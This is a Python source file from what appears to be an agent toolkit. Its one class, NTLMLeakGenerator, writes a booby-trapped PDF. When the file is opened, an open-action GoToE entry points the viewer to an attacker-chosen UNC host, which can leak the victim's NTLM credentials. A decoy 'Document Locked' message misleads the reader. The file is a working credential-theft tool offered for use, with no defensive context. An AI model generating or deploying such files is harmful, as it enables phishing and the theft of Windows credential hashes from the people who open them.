#!/usr/bin/env python3
# Copyright 2026 PyAgent Authors
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


class NTLMLeakGenerator:
    """ Generates files aimed at triggering NTLM leaks (UNC paths). """

    @staticmethod
    def generate_malicious_pdf(filename: str, unc_host: str):
        """
        Creates a PDF that attempts to trigger an NTLM leak via GoToE.
        Ported from 0xSojalSec-Bad-Pdf.
        """
        # Ensure UNC path format if not already
        if not unc_host.startswith("\\\\"):
            unc_host = f"\\\\{unc_host}\\"

        content = f'''%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
trailer
<</Size 4/Root 1 0 R>>
startxref
190
3 0 obj
<< /Type /Page
   /Contents 4 0 R
   /AA <<
       /O <<
          /F ({unc_host}test)
          /D [ 0 /Fit]
          /S /GoToE
          >>
       >>
       /Parent 2 0 R
       /Resources <<
            /Font <<
                /F1 <<
                    /Type /Font
                    /Subtype /Type1
                    /BaseFont /Helvetica
                    >>
                  >>
                >>
>>
endobj
4 0 obj<< /Length 100>>
stream
BT
/TI_0 1 Tf
14 0 0 14 10.000 753.976 Tm
0.0 0.0 0.0 rg
(Document Locked. Check Network Connectivity.) Tj
ET
endstream
endobj
trailer
<<
    /Root 1 0 R
>>
%%EOF
'''
        with open(filename, "w", encoding="ascii", errors="ignore") as f:
            f.write(content)
        return filename
